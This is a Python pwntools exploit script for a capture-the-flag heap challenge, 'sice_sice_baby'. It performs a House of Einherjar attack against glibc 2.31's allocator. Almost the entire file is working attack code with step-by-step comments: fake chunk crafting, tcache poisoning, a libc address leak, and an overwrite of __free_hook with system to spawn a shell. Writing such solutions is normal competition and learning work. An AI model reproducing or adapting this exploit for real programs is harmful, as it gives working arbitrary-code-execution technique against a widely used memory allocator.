from pwn import *

r = process("./sice_sice_baby", env={"LD_PRELOAD":"./libc-2.31.so"})
b = ELF("./sice_sice_baby", checksec=False)
l = ELF("./libc-2.31.so", checksec=False)

#r = remote("dicec.tf", 31914)
#b = ELF("./sice_sice_baby", checksec=False)
#l = ELF("./libc.so.6", checksec=False)

def malloc(size):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", str(size))

def free(index):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(index))

def edit(index, content):
    r.sendlineafter("> ", "3")
    r.sendlineafter("> ", str(index))
    r.sendafter("> ", content)

def view(index):
    r.sendlineafter("> ", "4")
    r.sendlineafter("> ", str(index))


### PHASE 1: Create a fake chunk that will be consolidated with, which survives unlink check

for i in range(7):
    malloc(0xc8) # 0 -> 6, to fill up 0xd0 tcache

for i in range(7):
    malloc(0x88) # 7 -> 13, to fill up 0x90 tcache

malloc(0xe8) # 14, to padding for chunk A to be allocated at address ending with 0x00

malloc(0xc8) # 15, chunk AX,to consolidate with chunk A and keep A's pointers on the heap
malloc(0x88) # 16, chunk A, fake chunk to be consolidated with in House of Einherjar (must be at address ending with 0x00)
malloc(0x18) # 17, dummy to prevent consolidation

malloc(0xc8) # 18, chunk B, to set chunk C and D's pointers to in order to have a pointer to be overwritten
malloc(0x18) # 19, dummy to prevent consolidation

malloc(0xc8) # 20, chunk CX, to consolidate with chunk C and keep C's pointers on the heap
malloc(0xc8) # 21, chunk C, will be A->fd, so C->bk must be crafted to point back to A
malloc(0x18) # 22, dummy to prevent consolidation

malloc(0xc8) # 23, chunk DX, to consolidate with chunk D and keep D's pointers on the heap
malloc(0xc8) # 24, chunk D, will be A->bk, so D->fd must be crafted to point back to A
malloc(0x18) # 25, dummy to prevent consolidation

# These will be for the 2nd phase, but we want to allocate everything first before starting to free things
for i in range(8):
    malloc(0xc8) # 26, 29, ... , 47, this and the next chunk will be used to create a 0x1a0 unsorted chunk
    malloc(0xc8) # 27, 30, ... , 48, allocating 0xa0 to this chunk, to be left with a 0x100 unsorted chunk
    malloc(0x18) # 28, 31, ... , 49, dummy to prevent consolidation

for i in range(7):
    free(i) # fill up 0xd0 tcache

for i in range(7):
    free(i + 7) # fill up 0x90 tcache

# Since 0x90 tcache is filled, the next 3 will be unsorted
free(21) # free C
free(16) # free A, now A->fd = C and C->bk = A
free(24) # free D, now D->fd = A and A->bk = D

# Consolidate A, C, and D with AX, CX, DX, leaves A, C and D's pointers on the heap
free(15)
free(23)
free(20)

# Reallocate tcache chunks
for i in range(7):
    malloc(0xc8) # 0 -> 6

for i in range(7):
    malloc(0x88) # 7 -> 13

malloc(0xe8) # 15, will be allocated at AX

malloc(0xc8) # 16, will be allocated at DX
malloc(0xc8) # 20, will be allocated at D

malloc(0xc8) # 21, will be allocated at CX
malloc(0xc8) # 23, will be allocated at C

for i in range(7):
    free(i) # fill up 0xd0 tcache

for i in range(7):
    free(i + 7) # fill up 0x90 tcache

# Since 0x90 tcache is filled, the next 3 will be unsorted
free(23) # free C
free(18) # free B, now B->fd = C and C->bk = B
free(20) # free D, now D->fd = B and B->bk = D

# Consolidate C, and D with CX, DX, leaves C and D's pointers on the heap
free(21)
free(16)

malloc(0xe8) # 0, will be allocated at CX
malloc(0xe8) # 1, will be allocated at DX

# Now we use the 2 above chunks to nullify the LSB of the pointers that are left on the heap, this is why we need A to be at address ending with 0x00
edit(0, b"\0"*0xd8) # nullify LSB of C->bk, it will now be A instead of B
edit(1, b"\0"*0xd0) # nullify LSB of D->fd, it will now be A instead of B

edit(15, b"\0"*0xc8 + p32(0x5c1)) # edit AX to craft fake metadata for A with the size of 0x5c0 and in-use bit set to 1

# --> PHASE 1 DONE: Achieved 3 fake chunks D -> A -> C, consolidating with A will now survive the unlink check
# Now we clean up what's left of this 1st phase
malloc(0x98) # 2, use up the rest of AX
malloc(0x98) # 3, use up the rest of CX
malloc(0x98) # 4, use up the rest of DX

### PHASE 2: Create a 0x100-sized chunk that will be freed into unsorted bin and consolidated with A

# Now we create 8 chunks with the size of 0x100, since 0xd0 tcache is filled, the next frees will make a 0x1a0 unsorted chunk
for i in range(26, 49, 3):
    free(i)
    free(i + 1) # free the chunks we added earlier in the 1st phase, but use in the 2nd phase
    malloc(0x98) # 5, 7, 9, 11, 13, 18, 21, 24, will be allocated in the above unsorted chunk, leave behind a 0x100 unsorted chunk
    malloc(0xe8) # 6, 8, 10, 12, 16, 20, 23, 26, since 0x100 - 0xf0 = 0x10 is smaller than the minimum of a chunk, this allocation will give us a 0x100 chunk instead

edit(5, b"\0"*0x90 + p64(0x5c0)) # Edit 5 to clear in-use bit of 6, also give it a prev_size of 0x5c0, which corresponds to A
r.interactive()
for i in [8, 10, 12, 16, 20, 23, 26]:
    free(i) # fill up 0x100 tcache

# --> PHASE 2 DONE: Achieved a 0x100 chunk that will be freed into unsorted bin and consolidated with A (which is chunk 6, the one we haven't freed yet)

### PHASE 3: Trigger House of Einherjar, corrupt tcache

free(6) # Trigger House of Einherjar, consolidate 6 with A

for i in range(7):
    malloc(0x88) # 6, 8, 10, 12, 16, 20, 23, refill 0x90 tcache

edit(17, "pepe") # edit a dummy small chunk created earlier to make it viewable
malloc(0x88) # 26, padding to push libc addresses into 17
view(17) # leak libc
l.address = u64(r.recv(6) + b'\0\0') - 0x1ebbe0 # for libc-2.31
#l.address = u64(r.recv(6) + b'\0\0') - 0x1eabe0 # for libc-2.30
log.info("libc: {}".format(hex(l.address)))

free(22) # free a random 0x20 tcache chunk
free(19) # free 19 to corrupt it

malloc(0xe8) # 19, padding to reach old 19
malloc(0x38) # 22, overlap old 19
edit(22, p64(l.symbols["__free_hook"] - 8) + p64(0)) # Overwrite old 19's fd with __free_hook - 8

malloc(0x18) # 27, next allocate will be in to __free_hook - 8
malloc(0x18) # 29, at __free_hook - 8

edit(29, b"/bin/sh\0" + p64(l.symbols["system"])) # overwrite __free_hook with system, write /bin/sh in front of it
free(29) # free the chunk at __free_hook - 8, pop shell

r.interactive()
